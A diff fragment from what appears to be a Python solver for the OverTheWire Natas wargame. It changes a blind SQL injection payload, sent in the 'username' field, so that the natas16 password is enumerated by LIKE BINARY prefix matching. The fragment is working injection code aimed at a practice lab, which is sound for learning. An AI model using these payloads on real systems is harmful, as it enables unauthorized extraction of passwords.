@@ -96,7 +96,7 @@ with Halo(text="Enumerating", spinner="dots") as loading:
             print("\033[F\033[K\033[F\033[K", end="")
 
             data = {
-                "username": f'natas16" AND SUBSTRING(password, {i}, 1) LIKE BINARY "{char}%" #'
+                "username": f'natas16" AND password LIKE BINARY "{passwd + char}%" #'
             }
 
             print(f"Password: {passwd}\nQuery: {data}")
